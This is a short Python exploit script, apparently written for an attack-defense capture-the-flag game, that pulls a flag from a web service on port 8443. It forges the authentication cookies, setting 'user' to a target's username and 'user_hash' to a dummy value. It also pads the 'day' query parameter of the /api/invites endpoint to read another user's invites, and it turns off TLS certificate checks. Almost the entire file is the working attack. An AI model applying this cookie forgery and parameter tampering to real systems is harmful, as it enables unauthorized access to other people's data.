#!/usr/bin/env python3

import sys
import json
import re

import requests
requests.packages.urllib3.disable_warnings()

FLAG_REGEX = r'[A-Za-z0-9]{31}='


def exploit(ip, flag_id):
    url = f'https://{ip}:8443'

    flag_id = json.loads(flag_id)
    username = flag_id['username']
    invite_date = flag_id['date']

    y, m, d = invite_date.split('-')
    assert len(y) == 4
    assert len(m) == 2
    assert len(d) == 2 and int(d) >= 1

    j = requests.get(f'{url}/api/invites',
        params={'year': y, 'month': m, 'day': d + '000000'},
        cookies={'user': username, 'user_hash': 'x'},
        verify=False
    ).text

    return re.findall(FLAG_REGEX, j)[0]


if __name__ == "__main__":
    ip = sys.argv[1]
    flag_id = sys.argv[2]

    print(exploit(ip, flag_id))
